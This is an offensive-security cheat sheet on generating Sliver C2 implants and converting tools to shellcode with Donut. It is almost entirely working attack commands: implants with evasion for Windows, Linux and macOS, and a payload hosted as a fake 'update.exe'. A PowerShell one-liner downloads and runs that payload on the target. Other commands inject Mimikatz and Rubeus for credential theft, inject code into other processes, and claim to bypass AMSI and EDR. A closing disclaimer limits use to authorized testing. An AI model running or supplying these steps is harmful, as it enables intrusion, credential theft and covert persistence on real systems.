# SLIVER + DONUT INTEGRATION

**Complete Visual Guide to C2 Shellcode Generation & In-Memory Execution**

---

## Basic Workflow

### 1. Generate Sliver Implant
```bash
sliver > generate --mtls c2.server.com:443 --os windows --arch amd64 --format shellcode --save implant.bin
```

### 2. Optional: Donut Conversion
```bash
$ donut -a 2 -f tool.exe -o shellcode.bin
```

### 3. Execute in Memory
```bash
sliver (session) > execute-shellcode -p 1234 shellcode.bin
```

---

## Complete Beacon Deployment Workflow

### Step-by-Step Beacon Deployment via HTTP

**Step 1: Generate beacon with evasion**
```bash
sliver > generate beacon --http your-server.com:8443 --os windows --evasion --save /path/to/file/
```

**Step 2: Start C2 listener**
```bash
sliver > http --lhost 0.0.0.0 --lport 8443
```

**Step 3: Add payload to website**
```bash
sliver > websites add-content --website mysite --web-path /download/update.exe --content /path/to/file/ACTUAL_FILENAME.exe --content-type application/octet-stream
```

**Step 4: Start website server (on different port)**
```bash
sliver > http --website mysite --lhost 0.0.0.0 --lport 80
```

**Step 5: Execute on target**
```powershell
# PowerShell command:
(New-Object System.Net.WebClient).DownloadFile('http://your-server.com:80/download/update.exe', "$env:TEMP\update.exe"); Start-Process "$env:TEMP\update.exe"
```

**Step 6: Wait for beacon callback**
```bash
sliver > beacons
```

**Step 7: Interact with beacon**
```bash
sliver > use [beacon-id]
```

### Key Points:
- C2 listener (8443) and website server (80) run on different ports
- Beacons use asynchronous communication (check-in intervals)
- Website hosting allows legitimate-looking payload delivery
- Evasion flag enables built-in anti-detection techniques

---

## Complete Generate Options

### Operating Systems
```bash
--os windows
--os linux
--os darwin  # macOS
```

### Architectures
```bash
--arch amd64  # 64-bit
--arch 386    # 32-bit
--arch arm64  # ARM 64-bit
--arch arm    # ARM 32-bit
```

### Format Options
```bash
--format exe          # Executable
--format shared       # Shared library (.dll/.so)
--format shellcode    # Raw shellcode
--format service      # Windows service
```

### Connection Types
```bash
--mtls host:port
--wg host:port     # WireGuard
--http host:port
--https host:port
--dns host
```

### Additional Flags
```bash
--evasion          # Enable evasion
--skip-symbols     # Strip symbols
--debug            # Debug build
--save path        # Save location
--name custom      # Custom name
```

### Donut Architecture
```bash
-a 1    # x86 (32-bit)
-a 2    # x64 (64-bit)
-a 3    # x86+x64 (dual-mode)
```

---

## Windows Generation Examples

### Standard Windows Executable with Evasion
```bash
sliver > generate --mtls your-server.com:443 --os windows --arch amd64 --evasion
```
Creates a standard Windows .exe with built-in evasion techniques

### Windows Shared Library (DLL)
```bash
sliver > generate --mtls your-server.com:443 --os windows --arch amd64 --format shared --evasion
```
Generates a .dll for DLL injection, sideloading, or reflective loading techniques

### Windows Shellcode
```bash
sliver > generate --mtls your-server.com:443 --os windows --arch amd64 --format shellcode --save payload.bin
```
Raw shellcode for custom loaders, process injection, or Donut conversion

### Windows Service Binary
```bash
sliver > generate --mtls your-server.com:443 --os windows --arch amd64 --format service --save service.exe
```
Service-compatible binary for Windows service persistence mechanisms

### Windows 32-bit for Legacy Systems
```bash
sliver > generate --mtls your-server.com:443 --os windows --arch 386 --evasion --save payload_x86.exe
```
32-bit implant for older Windows systems or WoW64 execution

---

## Linux Generation Examples

### Standard Linux ELF Binary
```bash
sliver > generate --mtls your-server.com:443 --os linux --arch amd64 --save linux_implant
```
Standard 64-bit Linux executable for modern systems

### Linux Shared Object (.so)
```bash
sliver > generate --mtls your-server.com:443 --os linux --arch amd64 --format shared --save implant.so
```
Shared library for LD_PRELOAD hijacking or library injection techniques

---

## macOS Generation Examples

### macOS Mach-O Binary
```bash
sliver > generate --mtls your-server.com:443 --os darwin --arch amd64 --save macos_implant
```
Standard macOS executable for Intel-based Macs

### macOS ARM64 (Apple Silicon)
```bash
sliver > generate --mtls your-server.com:443 --os darwin --arch arm64 --save macos_m1_implant
```
Native ARM64 implant for Apple Silicon (M1, M2, M3) Macs

### macOS Dylib (Dynamic Library)
```bash
sliver > generate --mtls your-server.com:443 --os darwin --arch amd64 --format shared --save implant.dylib
```
Dynamic library for DYLD_INSERT_LIBRARIES injection on macOS

---

## Practical Donut Examples

### Example 1: Mimikatz Execution
```bash
# Step 1: Convert Mimikatz to shellcode
$ donut -a 2 -f mimikatz.exe -o mimikatz.bin

# Step 2: Find target process
sliver (session) > ps

# Step 3: Inject into process
sliver (session) > execute-shellcode -p 4532 mimikatz.bin
```

### Example 2: Rubeus with Parameters
```bash
# Convert with arguments
$ donut -a 2 -f Rubeus.exe -p "kerberoast /outfile:hashes.txt" -o rubeus.bin

# Execute in target session
sliver (session) > execute-shellcode rubeus.bin
```

### Example 3: Sacrificial Process
```bash
# Spawn new process and inject
sliver (session) > spawndll -p C:\Windows\System32\notepad.exe /path/to/shellcode.bin

# Alternative: Sideload into legitimate process
sliver (session) > sideload -p 2048 -e RunMe /path/to/payload.dll
```

### Example 4: SharpHound Collection
```bash
# Convert SharpHound
$ donut -a 2 -f SharpHound.exe -p "-c All -d domain.local" -o sharphound.bin

# Execute enumeration
sliver (session) > execute-shellcode --rwx-pages sharphound.bin
```

### Example 5: Seatbelt Security Audit
```bash
# Generate Seatbelt shellcode
$ donut -a 2 -f Seatbelt.exe -p "All -full" -o seatbelt.bin

# Run full security checks
sliver (session) > execute-shellcode seatbelt.bin
```

### Example 6: Multi-Stage Deployment
```bash
#!/bin/bash

# Generate Sliver implant
sliver generate --mtls c2.com:443 --format shellcode --save stage1.bin

# Convert post-ex tool
donut -a 2 -f tool.exe -o stage2.bin

# Deploy via preferred method
```

---

## Injection Techniques

### Process Injection
```bash
execute-shellcode -p <pid> shellcode.bin
```

### RWX Pages
```bash
execute-shellcode --rwx-pages shellcode.bin
```

### Named Process
```bash
execute-shellcode --process-name explorer.exe
```

---

## Advanced Generation Patterns

### HTTP/HTTPS C2
```bash
# HTTP
generate --http your-server.com:80 --os windows --arch amd64

# HTTPS
generate --https your-server.com:443 --os windows --arch amd64
```

### DNS C2
```bash
# DNS tunneling
generate --dns your-server.com --os windows --arch amd64
```

### WireGuard C2
```bash
# WireGuard VPN
generate --wg your-server.com:51820 --os linux --arch amd64
```

### Multi-Protocol
```bash
# Multiple protocols
generate --mtls srv.com:443 --http srv.com:80 --dns srv.com --os windows --arch amd64
```

### Custom Named Implant
```bash
# Custom identifier
generate --name "FINANCE_SERVER_01" --mtls your-server.com:443 --os windows --arch amd64
```

### Debug Build
```bash
# With debug symbols
generate --mtls your-server.com:443 --debug --os linux --arch amd64
```

---

## Key Benefits

- **In-Memory Execution:** No files touch disk, reducing forensic artifacts
- **.NET Assembly Support:** Run C# tools without compilation issues
- **AMSI Bypass:** Donut includes built-in AMSI patching capabilities
- **Process Flexibility:** Inject into any process for better OpSec
- **EDR Evasion:** Harder to detect than traditional file-based execution
- **Position Independent:** Shellcode can run anywhere in memory
- **Cross-Platform:** Support for Windows, Linux, and macOS targets

---

## ⚠️ Legal & Ethical Considerations

**These techniques should ONLY be used in authorized penetration testing environments with proper written consent.**

Unauthorized access to computer systems is illegal under laws like the Computer Fraud and Abuse Act (CFAA) and similar legislation worldwide. Always practice in controlled lab environments like HackTheBox, TryHackMe, or your own isolated networks.
